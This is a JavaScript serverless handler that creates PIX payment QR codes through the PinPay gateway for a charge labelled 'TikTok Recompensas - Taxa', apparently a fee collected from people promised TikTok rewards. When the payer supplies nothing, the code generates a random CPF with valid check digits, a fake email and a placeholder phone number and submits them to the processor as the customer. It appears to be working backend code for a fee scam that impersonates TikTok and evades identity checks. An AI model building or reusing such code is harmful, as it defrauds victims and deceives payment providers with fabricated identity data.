const PINPAY_TOKEN = process.env.PINPAY_TOKEN;
const PINPAY_BASE  = 'https://api.usepinpay.com/functions/v1/api-v1';

function generateCPF() {
  const n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10));
  let d1 = n.reduce((acc, v, i) => acc + v * (10 - i), 0);
  d1 = 11 - (d1 % 11);
  if (d1 >= 10) d1 = 0;
  let d2 = n.reduce((acc, v, i) => acc + v * (11 - i), 0) + d1 * 2;
  d2 = 11 - (d2 % 11);
  if (d2 >= 10) d2 = 0;
  return n.join('') + d1 + d2;
}

function cleanName(nome) {
  const partes = String(nome || 'Cliente').trim().split(/\s+/).filter(Boolean);
  if (partes.length >= 2) return partes[0] + ' ' + partes[partes.length - 1];
  return partes[0] || 'Cliente';
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

  if (!PINPAY_TOKEN) {
    return res.status(500).json({ success: false, error: 'PINPAY_TOKEN (sk_live_...) nao configurada nas variaveis do servidor Vercel.' });
  }

  try {
    let b = req.body || {};
    if (typeof b === 'string') {
      try { b = JSON.parse(b); } catch (e) { b = {}; }
    }

    const amountReais = parseFloat(b.amount || b.valor || b.taxa || 21.00);
    if (!amountReais || amountReais <= 0) {
      return res.status(400).json({ success: false, error: 'amount invalido' });
    }
    const amountCents = Math.round(amountReais * 100);

    const nomeCompleto = cleanName(b.name || b.nome);
    let email = (b.email && String(b.email).trim()) || ('cliente' + Date.now() + '@gmail.com');
    let documentStr = (b.document && String(b.document).replace(/\D/g, '')) || generateCPF();
    if (documentStr.length < 11) documentStr = generateCPF();
    let phone = String(b.phone || b.phone_number || '11999999999').replace(/\D/g, '');
    if (phone.length < 10) phone = '11999999999';

    const externalRef = 'TK-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8);
    const payload = {
      amount: amountCents,
      description: 'TikTok Recompensas - Taxa',
      customer: {
        name: nomeCompleto,
        email: email,
        document: { number: documentStr },
        phone: phone
      },
      metadata: {
        external_reference: externalRef,
        checkout_url: b.url_full || ((req.headers['x-forwarded-proto'] || 'https') + '://' + (req.headers.host || 'localhost'))
      }
    };

    console.log('[generate_qr_gateway] Enviando para PinPay | R$' + amountReais + ' | ' + nomeCompleto);

    const response = await fetch(PINPAY_BASE + '/pix', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + PINPAY_TOKEN.trim(),
        'Content-Type': 'application/json',
        'Idempotency-Key': externalRef
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json().catch(() => ({}));

    if (!response.ok || !data.id) {
      console.error('[generate_qr_gateway] PinPay erro:', response.status, JSON.stringify(data));
      return res.status(502).json({ success: false, error: 'Erro ao criar PIX na PinPay', details: data });
    }

    const txId = String(data.id);
    const pixCode = (data.pix && data.pix.qr_code) || '';
    const qrImg = (data.pix && data.pix.qr_code_url) || '';

    console.log('[generate_qr_gateway] PinPay OK | tx=' + txId);

    return res.status(201).json({
      success: true,
      transactionKey: txId,
      payment_code: txId,
      pix_copy_paste: pixCode,
      pix_code: pixCode,
      qrCodeText: pixCode,
      qrCodeImage: qrImg,
      amount: amountReais,
      price_label: b.price_label || ('R$ ' + amountReais.toFixed(2).replace('.', ',')),
      expires_at: (data.pix && data.pix.expires_at) || (Date.now() + 10 * 60 * 1000)
    });
  } catch (err) {
    console.error('[generate_qr_gateway] ERRO:', err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
};
